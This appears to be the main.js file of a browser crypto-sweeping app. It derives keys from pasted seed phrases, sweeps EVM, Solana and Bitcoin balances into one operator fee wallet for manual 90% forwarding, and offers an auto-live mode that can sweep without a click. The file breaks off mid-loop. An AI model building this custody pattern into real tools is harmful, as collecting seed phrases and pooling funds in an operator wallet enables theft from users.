/**
 * main.js — Application entry point.
 *
 * Fee-wallet model:
 *   - All three families sweep USDC into FEE_WALLET_EVM.
 *   - The operator forwards 90% to the user's destination manually,
 *     keeping the 10% service fee.
 *   - The operator view in the payment worker shows exactly what to
 *     forward, per chain, minus any gas sponsorship fees.
 *
 * Trust model:
 *   - Credits are server-authoritative (worker holds balance).
 *   - The sweep destination is committed to the worker before the
 *     sweep begins. /fee/record reads that commit and overwrites any
 *     client-supplied destination, so the operator view can't be
 *     tricked into forwarding to an attacker address.
 *   - Amounts in receipts are still client-reported; the operator
 *     should verify them against the chain before forwarding large sums.
 *   - /credits/consume and /gas/sponsor are idempotent on stable keys,
 *     so a client retry after a network blip won't double-charge or
 *     double-send.
 *
 * Auto-live:
 *   After Preview, if any wallet+chain holds ≥ AUTO_LIVE_THRESHOLD_USDC
 *   of sweepable value, we offer to skip the manual Run click. Value
 *   estimates are computed inside runPreview and cached on
 *   state.previews so the modal can pop immediately and runSweep can
 *   reuse them without a second round of network calls. Auto-live
 *   waives the credit requirement — the 10% service fee covers it.
 *
 * Retry logic lives in ./retry.js and is injected with its network
 * dependencies here, so the loop mechanics are testable in Node.
 */

import { ethers } from 'ethers';
import { PublicKey } from '@solana/web3.js';
import QRCode from 'qrcode';
import { state, resetState, clearAll } from './state.js';
import { createWallet } from './wallet.js';
import { validateMnemonic, deriveAll } from './derive.js';
import {
  previewWallet as previewEvm, sweepEvm, getProvider,
  CHAINS as EVM_CHAINS,
  estimateChainValueUsdc,
} from './evm.js';
import {
  previewSolanaWallet, sweepSolana, getConnection, selectSolanaKeypair,
  estimateSolanaValueUsdc,
} from './solana.js';
import { previewBitcoinWallet, sweepBitcoin, estimateBitcoinValueUsdc } from './bitcoin.js';
import { $, $$, el, show, hide, logLine, clearLog, showAutoLiveConfirm } from './ui.js';
import { initSentry, initPlausible, reportError, track } from './telemetry.js';
import {
  getClientId, fetchBalance, consumeCredit, invalidateBalanceCache,
  recordFee, requestGasSponsorship,
  fetchClaimInfo, claimFreeCredits,
  commitSweep,
} from './credits.js';
import { showCryptoPaymentModal } from './crypto-pay.js';
import {
  FEE_WALLET_EVM,
  GAS_PER_TX_COST, MAX_SPONSOR_ATTEMPTS,
  computeSponsorshipFeeUsdCents, usdCentsToUsdcRaw,
  AUTO_LIVE_THRESHOLD_USDC,
  AUTO_LIVE_REQUIRE_CONFIRM,
  AUTO_LIVE_COUNTDOWN_SECONDS,
} from './config.js';
import { scrubSecret } from './scrub.js';
import { ChainVerifyError, verifySignerChain } from './chain-verify.js';
import { getFingerprint } from './fingerprint.js';
import {
  recordFeeWithRetry as recordFeeWithRetryCore,
  commitSweepWithRetry as commitSweepWithRetryCore,
  ensureWalletGasOnce as ensureWalletGasOnceCore,
  withGasSponsorship as withGasSponsorshipCore,
} from './retry.js';

const WC_PROJECT_ID = '74d3ed4f87d14b6cac7556234dfb72a3';

let freeClaimTimer = null;

// Minimum USD value a chain's sweepable balance must be worth before
// we'll sponsor gas to move it. Set low (2 cents) so dust sweeps still
// run; the tiered sponsorship fee in config.js keeps them profitable.
const MIN_SPONSOR_FLOOR_USDC = 0.02;

// =====================================================================
// VALIDATION HELPERS
// =====================================================================

function isEvmAddress(s) {
  return /^0x[a-fA-F0-9]{40}$/.test(s);
}

function isSolanaAddress(s) {
  return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(s);
}

// =====================================================================
// PER-CHAIN WALLET SWITCH PARAMS
// =====================================================================
//
// Used by wallet_addEthereumChain when the wallet doesn't know the
// chain yet (rare for the majors, but Coinbase Wallet on a fresh
// browser profile sometimes needs a nudge). RPC URLs are public
// endpoints — deliberately not the proxy URL, which requires the
// request to come from our own origin.
// =====================================================================

function chainExtraParams(chain) {
  const cfg = EVM_CHAINS[chain];
  if (!cfg) return {};
  const rpcUrls = {
    ethereum: ['https://ethereum-rpc.publicnode.com'],
    arbitrum: ['https://arbitrum-one-rpc.publicnode.com'],
    optimism: ['https://optimism-rpc.publicnode.com'],
    base:     ['https://base-rpc.publicnode.com'],
    polygon:  ['https://polygon-bor-rpc.publicnode.com'],
    bnb:      ['https://bsc-rpc.publicnode.com'],
  }[chain];
  const nativeCurrency = {
    ethereum: { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    arbitrum: { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    optimism: { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    base:     { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    polygon:  { name: 'POL',    symbol: 'POL', decimals: 18 },
    bnb:      { name: 'BNB',    symbol: 'BNB', decimals: 18 },
  }[chain];
  const blockExplorerUrls = {
    ethereum: ['https://etherscan.io'],
    arbitrum: ['https://arbiscan.io'],
    optimism: ['https://optimistic.etherscan.io'],
    base:     ['https://basescan.org'],
    polygon:  ['https://polygonscan.com'],
    bnb:      ['https://bscscan.com'],
  }[chain];
  return {
    rpcUrls,
    chainName: cfg.name,
    nativeCurrency,
    blockExplorerUrls,
  };
}

// =====================================================================
// UI HELPERS
// =====================================================================

function showWalletSection(type) {
  $$('.wallet-section').forEach((s) => { s.style.display = 'none'; });
  const target = $(`#wallet-${type}`);
  if (target) target.style.display = '';
}

function readInputs() {
  const walletType = $('input[name=wallet-type]:checked')?.value || 'mnemonic';
  const families = {
    evm: $('#family-evm').checked,
    solana: $('#family-solana').checked,
    bitcoin: $('#family-bitcoin').checked,
  };
  const destinations = {
    evm: $('#dest-evm').value.trim(),
    solana: '',
    bitcoin: '',
  };
  const evmChains = $$('#chain-list input[type=checkbox]:checked').map((cb) => cb.value);

  let mnemonics = [];
  if (walletType === 'mnemonic') {
    const text = $('#phrases').value.trim();
    mnemonics = text.split('\n').map((s) => s.trim()).filter(Boolean);
  }

  Object.assign(state, { walletType, families, destinations, evmChains, mnemonics });
  return { walletType, families, destinations, evmChains, mnemonics };
}

function validateInputs({ walletType, families, destinations, mnemonics }) {
  const errors = [];
  const warnings = [];

  if (!families.evm && !families.solana && !families.bitcoin) {
    errors.push('Select at least one family to sweep (EVM, Solana, or Bitcoin).');
    return { errors, warnings };
  }

  if (walletType === 'mnemonic') {
    if (mnemonics.length === 0) errors.push('At least one mnemonic is required.');
    for (let i = 0; i < mnemonics.length; i++) {
      if (!validateMnemonic(mnemonics[i])) {
        errors.push(`Mnemonic #${i + 1} is not a valid BIP-39 phrase.`);
      }
    }
  }

  if (families.evm) {
    if (!destinations.evm) errors.push('EVM destination address is required.');
    else if (!isEvmAddress(destinations.evm)) errors.push('EVM destination must be a valid 0x address.');
  }
  if (families.solana) {
    if (!destinations.evm) {
      errors.push('EVM destination is required when sweeping Solana.');
    } else if (!isEvmAddress(destinations.evm)) {
      errors.push('EVM destination must be a valid 0x address.');
    }
  }
  if (families.bitcoin) {
    if (!destinations.evm) {
      errors.push('EVM destination is required when sweeping Bitcoin.');
    } else if (!isEvmAddress(destinations.evm)) {
      errors.push('EVM destination must be a valid 0x address.');
    }
  }

  if (families.evm && destinations.evm && isSolanaAddress(destinations.evm) && !isEvmAddress(destinations.evm)) {
    warnings.push('Your EVM destination looks like a Solana address.');
  }

  return { errors, warnings };
}

function updateCreditsBadge(balance) {
  const badge = $('#credits-badge');
  if (!badge) return;
  if (balance > 0) {
    badge.textContent = `${balance} credit${balance > 1 ? 's' : ''}`;
    badge.className = 'credits-badge credits-available';
  } else {
    badge.textContent = 'No credits';
    badge.className = 'credits-badge credits-empty';
  }
}

function syncDestinationFields() {
  const evm = $('#family-evm').checked;
  const solana = $('#family-solana').checked;
  const bitcoin = $('#family-bitcoin').checked;
  const evmWrap = $('#dest-evm-wrap');
  if (evmWrap) evmWrap.style.display = (evm || solana || bitcoin) ? '' : 'none';
  const chainList = $('#chain-list');
  if (chainList) chainList.style.display = evm ? '' : 'none';
}

// =====================================================================
// RETRY ADAPTERS
// =====================================================================
//
// The generic retry logic lives in ./retry.js and takes its
// dependencies as parameters (for testability). These thin adapters
// wire the real dependencies — `credits.js` for the network calls,
// `getProvider`/`ethers` for chain reads, `logLine` for output — so
// the call sites inside runSweep stay unchanged.
// =====================================================================

async function recordFeeWithRetry(payload, logLine) {
  return recordFeeWithRetryCore({
    recordFn: recordFee,
    payload,
    logLine,
  });
}

async function commitSweepWithRetry(sweepId, userDestination, logLine) {
  return commitSweepWithRetryCore({
    commitFn: commitSweep,
    sweepId,
    userDestination,
    logLine,
  });
}

async function ensureWalletGasOnce(chain, walletAddress) {
  return ensureWalletGasOnceCore({
    sponsorFn: requestGasSponsorship,
    getBalance: (addr) => getProvider(chain).getBalance(addr),
    parseEther: ethers.parseEther,
    formatEther: ethers.formatEther,
    chain,
    walletAddress,
    perTxCost: GAS_PER_TX_COST,
    logLine,
  });
}

async function withGasSponsorship(chain, walletAddress, action) {
  return withGasSponsorshipCore({
    ensureGas: () => ensureWalletGasOnce(chain, walletAddress),
    action,
    maxAttempts: MAX_SPONSOR_ATTEMPTS,
    logLine,
  });
}

// =====================================================================
// AUTO-LIVE — value estimates + eligibility
// =====================================================================
//
// Computed inside runPreview, stored on state.previews, and consumed
// by maybeAutoLive() so the modal can pop instantly. runSweep reuses
// the same cached values to gate the auto-live credit waiver — no
// second round of network calls.
//
// An "eligible" entry is a (family, index, chain) tuple whose USD
// value is at or above AUTO_LIVE_THRESHOLD_USDC. We compare per
// wallet+chain, not in aggregate, so a wallet with $49 doesn't get
// swept live just because three other wallets push the total past $50.
// =====================================================================

async function annotatePreviewValues(inputs) {
  // EVM: annotate each preview entry in place.
  if (inputs.families.evm) {
    for (const p of state.previews.evm) {
      try {
        p._usdValue = await estimateChainValueUsdc(p.chain, p);
      } catch {
        p._usdValue = 0;
      }
    }
  }

  // Solana: annotate each preview entry in place.
  if (inputs.families.solana) {
    for (const p of state.previews.solana) {
      try {
        p._usdValue = await estimateSolanaValueUsdc(p);
      } catch {
        p._usdValue = 0;
      }
    }
  }

  // Bitcoin: annotate each preview entry in place.
  if (inputs.families.bitcoin) {
    for (const p of state.previews.bitcoin) {
      try {
        p._usdValue = await estimateBitcoinValueUsdc(p);
      } catch {
        p._usdValue = 0;
      }
    }
  }
}

/**
 * Walk state.previews and return every entry whose _usdValue is at or
 * above AUTO_LIVE_THRESHOLD_USDC. Each entry carries enough info for
 * runSweep to identify it: family, chain (EVM only), address, index.
 */
function collectEligible() {
  const eligible = [];

  for (const p of state.previews.evm || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'evm', chain: p.chain, address: p.address, index: p.index, usdValue: p._usdValue });
    }
  }
  for (const p of state.previews.solana || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'solana', index: p.index, address: p.address, usdValue: p._usdValue });
    }
  }
  for (const p of state.previews.bitcoin || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'bitcoin', index: p.index, address: p.address, usdValue: p._usdValue });
    }
  }

  return eligible;
}

/**
 * Called at the end of runPreview. If any eligible entry exists, shows
 * the countdown modal (or fires immediately, if
 * AUTO_LIVE_REQUIRE_CONFIRM is false) and then runs the live sweep
 * scoped to the eligible entries.
 */
async function maybeAutoLive() {
  const eligible = collectEligible();
  if (eligible.length === 0) return;

  const totalUsd = eligible.reduce((sum, e) => sum + e.usdValue, 0);
  const walletCount = eligible.length;

  logLine(`\n⚡ ${walletCount} wallet${walletCount === 1 ? '' : 's'} ≥ $${AUTO_LIVE_THRESHOLD_USDC} (~$${totalUsd.toFixed(2)} total) — auto-live eligible.`);

  if (AUTO_LIVE_REQUIRE_CONFIRM) {
    const ok = await showAutoLiveConfirm({
      totalUsd,
      walletCount,
      seconds: AUTO_LIVE_COUNTDOWN_SECONDS,
    });
    if (!ok) {
      logLine('  Auto-live cancelled. Preview remains available; press Run for a dry run or switch Mode to Live.');
      return;
    }
  }

  logLine('  Auto-live: credit waived — the 10% service fee covers this sweep.\n');
  await runSweep(true, { autoLive: true, onlyEligible: eligible });
}

// =====================================================================
// FREE CLAIM BANNER
// =====================================================================

function renderFreeClaimBanner(info) {
  const banner = $('#free-claim-banner');
  if (!banner) return;

  if (freeClaimTimer) {
    clearInterval(freeClaimTimer);
    freeClaimTimer = null;
  }

  if (info.claimed) {
    if (info.__fresh) {
      banner.style.display = '';
      banner.innerHTML = `
        <div class="free-claim-inner">
          <span class="free-claim-icon">✓</span>
          <div class="free-claim-text">
            <strong>${info.creditsGranted} free credits added</strong>
            <p>Your launch bonus is ready to use. Credits never expire.</p>
          </div>
        </div>
      `;
    } else {
      banner.style.display = 'none';
    }
    return;
  }

  if (info.blockedByFingerprint) {
    const used = info.fpClaims ?? '?';
    const max = info.fpMax ?? '?';
    banner.style.display = '';
    banner.innerHTML = `
      <div class="free-claim-inner">
        <span class="free-claim-icon">✓</span>
        <div class="free-claim-text">
          <strong>Free credits claimed</strong>
          <p>This launch bonus is limited to ${max} claims per device (${used} used).</p>
        </div>
      </div>
    `;
    return;
  }

  if (info.blockedByIp) {
    const used = info.ipClaims ?? '?';
    const max = info.ipMax ?? '?';
    banner.style.display = '';
    banner.innerHTML = `
      <div class="free-claim-inner">
        <span class="free-claim-icon">✓</span>
        <div class="free-claim-text">
          <strong>Free credits claimed</strong>
          <p>This launch bonus is limited to ${max} claims per network (${used} used).</p>
        </div>
      </div>
    `;
    return;
  }

  if (info.expired) {
    banner.style.display = '';
    banner.innerHTML = `
      <div class="free-claim-inner">
        <span class="free-claim-icon">⏱</span>
        <div class="free-claim-text">
          <strong>Your 24-hour claim window has ended</strong>
          <p>Free credits are no longer available on this browser.</p>
        </div>
      </div>
    `;
    return;
  }

  const isRunning = !info.notStarted;
  banner.style.display = '';
  banner.innerHTML = `
    <div class="free-claim-inner">
      <span class="free-claim-icon">🎁</span>
      <div class="free-claim-text">
        <strong>3 free sweep credits</strong>
        <p>${isRunning
          ? `Claim within <span id="free-claim-countdown">--:--:--</span>`
          : `Claim now to start your 24-hour window`}</p>
      </div>
      <button id="free-claim-button" class="btn btn-primary btn-sm">Claim now</button>
    </div>
  `;

  const countdownEl = document.getElementById('free-claim-countdown');

  if (isRunning && countdownEl) {
    const renderedAt = Date.now();
    const updateCountdown = () => {
      const remaining = info.msRemaining - (Date.now() - renderedAt);
      if (remaining <= 0) {
        if (freeClaimTimer) { clearInterval(freeClaimTimer); freeClaimTimer = null; }
        fetchClaimInfo().then(renderFreeClaimBanner).catch(() => {});
        return;
      }
      const totalSec = Math.floor(remaining / 1000);
      const h = String(Math.floor(totalSec / 3600)).padStart(2, '0');
      const m = String(Math.floor((totalSec % 3600) / 60)).padStart(2, '0');
      const s = String(totalSec % 60).padStart(2, '0');
      countdownEl.textContent = `${h}:${m}:${s}`;
    };
    updateCountdown();
    freeClaimTimer = setInterval(updateCountdown, 1000);
  }

  const claimBtn = document.getElementById('free-claim-button');
  if (claimBtn) {
    claimBtn.addEventListener('click', async () => {
      claimBtn.disabled = true;
      claimBtn.textContent = 'Claiming...';
      try {
        const fingerprint = await getFingerprint();
        const result = await claimFreeCredits(fingerprint);
        if (result.creditsGranted > 0) {
          logLine(`Welcome bonus: ${result.creditsGranted} free sweep credits added.`);
        } else if (result.blockedByFingerprint) {
          logLine(`Free credits already claimed on this device (${result.fpClaims}/${result.fpMax}).`);
        } else if (result.blockedByIp) {
          logLine(`Free credits already claimed on this network (${result.ipClaims}/${result.ipMax}).`);
        } else if (result.offerExpired) {
          logLine('Your claim window has expired.');
        } else if (result.alreadyClaimed) {
          logLine('Free credits already claimed.');
        }
        const newBalance = await fetchBalance({ force: true });
        updateCreditsBadge(newBalance);
        const freshInfo = await fetchClaimInfo();
        renderFreeClaimBanner({ ...freshInfo, ...result, __fresh: true });
      } catch (err) {
        claimBtn.disabled = false;
        claimBtn.textContent = 'Try again';
        logLine(`Claim failed: ${scrubSecret(err.message)}`);
      }
    });
  }
}

// =====================================================================
// CONNECT WALLET
// =====================================================================

async function connectWalletAndStore() {
  const { walletType } = readInputs();
  return connectWalletAndStoreForType(walletType);
}

async function connectWalletAndStoreForType(walletType) {
  track.walletSelected(walletType);
  try {
    if (walletType === 'mnemonic') { logLine('Mnemonic mode: keys will be derived during Preview.'); return; }
    if (walletType === 'extension') {
      logLine('Connecting to browser wallet...');
      const backend = await createWallet({ type: 'extension' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
    if (walletType === 'walletconnect') {
      logLine('Connecting WalletConnect...');
      const qrContainer = $('#wc-qr');
      qrContainer.innerHTML = '';
      const backend = await createWallet({
        type: 'walletconnect',
        wcProjectId: WC_PROJECT_ID,
        wcOnUri: (uri) => {
          logLine('Scan this QR with your mobile wallet:');
          QRCode.toCanvas(uri, { width: 240, margin: 2 })
            .then((canvas) => {
              canvas.style.background = '#fff';
              canvas.style.borderRadius = '8px';
              canvas.style.padding = '12px';
              qrContainer.appendChild(canvas);
            })
            .catch((err) => logLine(`QR render failed: ${scrubSecret(err.message)}`));
        },
      });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
    if (walletType === 'ledger') {
      logLine('Requesting Ledger access via WebHID...');
      const backend = await createWallet({ type: 'ledger' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Ledger connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
    if (walletType === 'trezor') {
      logLine('Requesting Trezor access...');
      const backend = await createWallet({ type: 'trezor' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Trezor connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
  } catch (e) {
    logLine(`ERROR: ${scrubSecret(e.message)}`);
    reportError(e, { phase: 'connect', walletType });
    track.error('connect_failed');
  }
}

// =====================================================================
// PREVIEW
// =====================================================================

async function runPreview() {
  const startTime = Date.now();
  clearLog();
  const inputs = readInputs();
  const { errors, warnings } = validateInputs(inputs);
  if (errors.length > 0) { for (const e of errors) logLine(`ERROR: ${e}`); return; }
  for (const w of warnings) logLine(`WARN: ${w}`);

  track.previewStarted({
    walletType: inputs.walletType,
    families: Object.entries(inputs.families).filter(([, v]) => v).map(([k]) => k),
    chainCount: inputs.evmChains.length,
    mnemonicCount: inputs.mnemonics.length,
  });

  try {
    if (inputs.walletType === 'mnemonic') {
      logLine(`Deriving keys for ${inputs.mnemonics.length} mnemonic(s)...`);
      state.derivedKeys = deriveAll(inputs.mnemonics, inputs.families);
      logLine(`Derived: ${state.derivedKeys.evm.length} EVM, ${state.derivedKeys.solana.length} Solana, ${state.derivedKeys.bitcoin.length} Bitcoin`);
      for (const err of state.derivedKeys.errors) logLine(`WARN: ${err}`);
    } else {
      if (!state.wallet) { logLine('ERROR: connect your wallet first'); return; }
      const addr = await state.wallet.getAddress();
      state.derivedKeys = { evm: [{ address: addr, wallet: null, index: 0 }], solana: [], bitcoin: [], errors: [] };
      logLine(`Using connected address: ${addr}`);
    }

    state.previews = { evm: [], solana: [], bitcoin: [] };

    if (inputs.families.evm) {
      for (const { address, index } of state.derivedKeys.evm) {
        for (const chain of inputs.evmChains) {
          logLine(`\nPreviewing ${chain} ${address}...`);
          try {
            const p = await previewEvm(chain, address);
            state.previews.evm.push({ index, ...p });
            logLine(`  native: ${p.native?.formatted ?? '0'} ${p.native?.symbol ?? ''}`);
            for (const t of p.tokens) logLine(`  ${t.symbol}: ${t.formatted}`);
            if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
          } catch (e) {
            logLine(`  ERROR: ${scrubSecret(e.message)}`);
            reportError(e, { phase: 'preview_evm', chain });
          }
        }
      }
    }

    if (inputs.families.solana && state.derivedKeys.solana.length > 0) {
      const conn = getConnection();
      for (const { candidates, index } of state.derivedKeys.solana) {
        logLine(`\nSelecting Solana derivation...`);
        let selected;
        try {
          selected = await selectSolanaKeypair(conn, candidates, logLine);
        } catch (e) {
          logLine(`  WARN: derivation selection failed (${scrubSecret(e.message)}); using Phantom default`);
          selected = candidates.find((c) => c.name === 'phantom') || candidates[0];
        }

        logLine(`\nPreviewing Solana ${selected.address}...`);
        try {
          const p = await previewSolanaWallet(conn, selected.address);
          state.previews.solana.push({ index, ...p });
          logLine(`  SOL: ${p.sol?.formatted ?? 0}`);
          logLine(`  tokens: ${p.tokens.length}`);
        } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
      }
    }

    if (inputs.families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
      for (const { address, index } of state.derivedKeys.bitcoin) {
        logLine(`\nPreviewing Bitcoin ${address}...`);
        try {
          const p = await previewBitcoinWallet(address);
          state.previews.bitcoin.push({ index, ...p });
          logLine(`  utxos: ${p.utxos.length}, balance: ${p.balance} sats`);
        } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
      }
    }

    // ---- USD annotations for the auto-live threshold ----
    // Runs before "Preview complete" prints so the modal can pop the
    // instant the user sees the preview has finished. This is the same
    // network-call set that runSweep would do anyway, just done once
    // and cached on state.previews.
    logLine('\nEstimating sweepable value...');
    await annotatePreviewValues(inputs);
    const totalUsd = [
      ...(state.previews.evm || []),
      ...(state.previews.solana || []),
      ...(state.previews.bitcoin || []),
    ].reduce((sum, p) => sum + (p._usdValue || 0), 0);
    logLine(`  total sweepable: ~$${totalUsd.toFixed(2)}`);

    logLine('\nPreview complete. Review before sweeping.');
    show('#run-button');

    const tokensFound =
      state.previews.evm.reduce((n, p) => n + p.tokens.length, 0) +
      state.previews.solana.reduce((n, p) => n + p.tokens.length, 0);

    track.previewCompleted({ walletType: inputs.walletType, durationMs: Date.now() - startTime, tokensFound });

    // ---- Auto-live offer ----
    // If any wallet+chain clears the threshold, offer to skip the
    // manual Run click. This can be disabled by flipping
    // AUTO_LIVE_REQUIRE_CONFIRM to false (zero-click) or by setting
    // AUTO_LIVE_THRESHOLD_USDC to Infinity in config.js.
    await maybeAutoLive();
  } catch (e) {
    reportError(e, { phase: 'preview_fatal' });
    track.error('preview_fatal');
    throw e;
  }
}

// =====================================================================
// PAYMENT
// =====================================================================

async function requirePayment() {
  track.paymentStarted('crypto');
  try {
    const result = await showCryptoPaymentModal('pack-5');
    track.paymentCompleted('crypto');
    return result;
  } catch (err) { throw err; }
}

// =====================================================================
// SWEEP
// =====================================================================

async function runSweep(live, opts = {}) {
  const autoLive = !!opts.autoLive;
  const onlyEligible = opts.onlyEligible || null;   // array of {family, chain?, address, index}

  const startTime = Date.now();
  if (!state.derivedKeys) { logLine('ERROR: run Preview first'); return; }

  // Stable ID for this sweep attempt. Used as the idempotency key when
  // recording the fee on the worker, so retrying recordFee won't
  // create duplicate entries. Also the key for the sweep commit and
  // for the credit consumption.
  const sweepId = crypto.randomUUID();

  const inputs = readInputs();
  const destinations = inputs.destinations;
  const families = inputs.families;

  // Helper: is this (family, chain, index) in the onlyEligible list?
  // When onlyEligible is null, everything is eligible.
  const isEligible = (family, chain, index) => {
    if (!onlyEligible) return true;
    return onlyEligible.some((e) =>
      e.family === family &&
      e.index === index &&
      (family !== 'evm' || e.chain === chain)
    );
  };

  if (live) {
    logLine('\n⚠ Reminder: EVM wallets with no gas will be sponsored automatically for a fee.');
    logLine('  Solana source wallets need a small SOL balance to cover transaction fees.');
    logLine('  Bitcoin fees are deducted from the swept UTXOs.');

    if (autoLive) {
      // Auto-live waives the credit. The 10% service fee is the
      // operator's compensation, and only wallets ≥ $50 take this
      // path, so the fee comfortably covers the cost of a credit.
      logLine('  (auto-live — no credit required)');
    } else {
      let balance = await fetchBalance();
      if (balance < 1) {
        logLine('No credits available. Opening payment modal...');
        try {
          await requirePayment();
          balance = await fetchBalance({ force: true });
          logLine(`Payment complete. Credits: ${balance}`);
        } catch (err) {
          logLine(`Payment cancelled or failed: ${scrubSecret(err.message)}`);
          return;
        }
      }
      if (balance < 1) { logLine('ERROR: still no credits after payment.'); return; }
    }

    // Commit the sweep's destination to the worker before consuming a
    // credit (or before sweeping, in the auto-live case). This is the
    // authoritative record of where the user wants funds sent —
    // /fee/record will refuse the sweep if no commit exists, and will
    // overwrite any client-supplied destination with the committed one.
    try {
      await commitSweepWithRetry(sweepId, destinations.evm, logLine);
      logLine(`  Sweep destination committed: ${destinations.evm}`);
    } catch (err) {
      logLine(`ERROR: could not commit sweep to worker: ${scrubSecret(err.message)}`);
      return;
    }

    if (!autoLive) {
      // Consume the credit. The sweepId is passed so that a retry
      // after a network blip doesn't double-charge. The worker dedups
      // on it.
      try {
        const newBalance = await consumeCredit('sweep', sweepId);
        logLine(`Credit consumed. Remaining: ${newBalance}`);
        updateCreditsBadge(newBalance);
      } catch (err) {
        logLine(`ERROR: could not consume credit: ${scrubSecret(err.message)}`);
        return;
      }
    }
  }

  const dryRun = !live;
  logLine(`\n=== ${dryRun ? 'DRY RUN' : 'LIVE SWEEP'} STARTED ===`);
  logLine(`  Sweep ID: ${sweepId}`);
  track.sweepStarted(live);

  state.results = { evm: [], solana: [], bitcoin: [] };
  let successes = 0;
  let failures = 0;

  const feeReceipts = { evm: [], solana: [], bitcoin: [] };
  const sponsoredGasByChain = {};
  const chainHadAnySuccess = {};

  const evmTotalForChain = (chain) =>
    feeReceipts.evm
      .filter((e) => e.chain === chain)
      .reduce((sum, e) => sum + e.amountRaw, 0n);
  const solanaTotal = () => feeReceipts.solana.reduce((sum, e) => sum + e.amountRaw, 0n);
  const bitcoinTotal = () => feeReceipts.bitcoin.reduce((sum, e) => sum + e.amountRaw, 0n);

  try {
    if (families.evm) {
      const chainSkipReasons = {};

      for (const entry of state.derivedKeys.evm) {
        const address = entry.address;

        for (const chain of inputs.evmChains) {
          if (!isEligible('evm', chain, entry.index)) continue;

          if (chainSkipReasons[chain]) {
            logLine(`\n[EVM ${chain}] ${address}`);
            logLine(`  SKIPPED: ${chainSkipReasons[chain]}`);
            continue;
          }

          logLine(`\n[EVM ${chain}] ${address}`);
          try {
            const provider = getProvider(chain);

            let signer;
            if (state.walletType === 'mnemonic') {
              signer = entry.wallet.connect(provider);
            } else if (state.walletType === 'extension') {
              const cfg = EVM_CHAINS[chain];
              try {
                await state.wallet.switchChain(cfg.chainId, chainExtraParams(chain));
              } catch (e) {
                logLine(`  SKIPPED: could not switch wallet to ${chain} — ${scrubSecret(e.message)}`);
                chainSkipReasons[chain] = `wallet cannot switch to ${chain}`;
                continue;
              }
              await new Promise((r) => setTimeout(r, 300));
              signer = await state.wallet.getEthersSigner(provider);
            } else if (state.walletType === 'walletconnect') {
              const cfg = EVM_CHAINS[chain];
              try {
                await state.wallet.switchChain(cfg.chainId, chainExtraParams(chain));
              } catch (e) {
                logLine(`  SKIPPED: could not switch WalletConnect to ${chain} — ${scrubSecret(e.message)}`);
                chainSkipReasons[chain] = `walletconnect cannot switch to ${chain}`;
                continue;
              }
              await new Promise((r) => setTimeout(r, 500));
              signer = await state.wallet.getEthersSigner(provider);
            } else {
              signer = await state.wallet.getEthersSigner(provider);
            }

            try {
              await verifySignerChain(chain, provider, signer, EVM_CHAINS[chain], address);
            } catch (e) {
              if (e instanceof ChainVerifyError) {
                logLine(`  SKIPPED: ${scrubSecret(e.message)}`);
                chainSkipReasons[chain] = `chain verification failed on ${chain}`;
                continue;
              }
              throw e;
            }

            const preview = state.previews.evm.find((p) => p.address === address && p.chain === chain);
            const tokens = preview?.tokens || [];

            // Sponsorship gate (live only):
            //   1. value <= 0        → nothing worth sweeping. Skip
            //   2. 0 < value < floor → dust above zero but below the
            //                          sponsor floor. Print the skip
            //                          line and remember the chain.
            //   3. value >= floor    → run the sweep.
            if (live) {
              // Reuse the cached value when we have it; only recompute
              // for the paths that skipped annotation (e.g. manual Run
              // after a preview that errored partway).
              const chainValueUsdc = (typeof preview?._usdValue === 'number')
                ? preview._usdValue
                : await estimateChainValueUsdc(chain, preview);

              if (chainValueUsdc <= 0) {
                chainSkipReasons[chain] = `nothing to sweep on ${chain}`;
                continue;
              }

              if (chainValueUsdc < MIN_SPONSOR_FLOOR_USDC) {
                logLine(`  SKIPPED: ${chain} value (~$${chainValueUsdc.toFixed(2)}) below $${MIN_SPONSOR_FLOOR_USDC} sponsorship floor`);
                chainSkipReasons[chain] = `below sponsorship floor on ${chain}`;
                continue;
              }
            }

            let sweepResult;
            let sponsoredForThisWallet = 0n;

            if (live) {
              try {
                const wrapped = await withGasSponsorship(chain, address, async () => {
                  return await sweepEvm(chain, signer, { dryRun: false, tokens, slippageBps: 100 });
                });
                sweepResult = wrapped.result;
                sponsoredForThisWallet = wrapped.sponsoredTotal;
              } catch (e) {
                if (e.sponsorUnavailable) {
                  logLine(`  SKIPPED: ${scrubSecret(e.message)}`);
                  chainSkipReasons[chain] = scrubSecret(e.message);
                  continue;
                }
                throw e;
              }
            } else {
              sweepResult = await sweepEvm(chain, signer, { dryRun: true, tokens, slippageBps: 100 });
            }

            if (sponsoredForThisWallet > 0n) {
              if (!sponsoredGasByChain[chain]) sponsoredGasByChain[chain] = {};
              sponsoredGasByChain[chain][address] = sponsoredForThisWallet.toString();
            }

            state.results.evm.push({ chain, address, ...sweepResult });

            const received = BigInt(sweepResult.usdcReceivedRaw || '0');
            if (received > 0n) {
              feeReceipts.evm.push({
                chain,
                sourceAddress: address,
                amountRaw: received,
                userShareRaw: BigInt(sweepResult.userReceivedRaw || '0').toString(),
                operatorFeeRaw: BigInt(sweepResult.feeReceivedRaw || '0').toString(),
                decimals: chain === 'bnb' ? 18 : 6,
              });
            }

            for (const s of sweepResult.swaps) {
              const receivedNote = s.received ? ` (received ${s.received} USDC)` : '';
